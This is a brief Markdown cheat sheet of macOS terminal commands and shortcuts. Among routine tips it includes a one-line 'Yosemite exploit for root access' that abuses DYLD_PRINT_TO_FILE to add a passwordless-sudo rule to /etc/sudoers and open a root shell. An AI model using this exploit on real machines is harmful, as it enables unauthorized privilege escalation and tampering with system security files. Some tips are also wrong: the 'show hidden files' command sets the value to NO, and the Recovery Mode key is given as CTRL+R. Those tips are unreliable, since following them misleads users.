### Always show hidden files

```bash
defaults write com.apple.finder AppleShowAllFiles NO
```

### Start Apache on system startup

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

### Keyboard shortcuts

```bash
DEL = FN + BACKSPACE
PAGEUP/PAGEDOWN = FN + UP/DOWN
END = FN + RIGHT
HOME = FN + LEFT
MINIMIZE CURRENT WINDOW = CMD + M
SCREEN SHOT (PART) = CMD + SHIFT + 4
SCREEN SHOT (DESKTOP) = CMD + SHIFT + 3
CLOSE ACTIVE WINDOW = CMD + W
EXIT PROGRAM = CMD + Q
```

### Yosemite exploit for root access

```bash
echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
```

### Add mysql to terminal shell

```bash
echo 'export PATH=/usr/local/mysql/bin:$PATH' >> ~/.bash_profile
. ~/.bash_profile
```

### Install file (e.g. composer.phar) globally

```bash
sudo mv %file% /usr/local/bin/%file%
```

### Disable SIP (System Integrity Protection)

- restart OSX
- hold CTRL+R key to reboot into `Recovery Mode`
- go to `Utilities` > `Terminal`
- type `csrutil disable`
- reboot

### Disable `Your disk is almost full` notification

- disable `SIP` (check solution above)
- type in the terminal:

```
launchctl unload -w /System/Library/LaunchAgents/com.apple.diskspaced.plist
```
